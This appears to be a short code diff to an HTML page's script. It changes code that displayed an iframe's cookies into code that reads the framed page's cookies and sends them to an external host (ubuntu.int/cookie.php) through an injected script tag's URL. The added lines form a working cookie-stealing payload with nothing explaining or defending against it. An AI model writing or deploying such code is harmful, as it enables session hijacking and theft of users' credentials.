@@ -3,10 +3,10 @@
 <script type="text/javascript">
 window.onload = function(){
 		var iframe = document.getElementById("ifr");
-		var ifr_doc = iframe.contentWindow.document.body;
+		var childCookies = iframe.contentWindow.document.cookie;
 		script = document.createElement("script");
-		script.innerHTML = "document.write(document.cookie)";
-		ifr_doc.appendChild(script);
+		script.setAttribute("src","http://ubuntu.int/cookie.php?line="+childCookies);
+		document.body.appendChild(script);
 		
 }
 
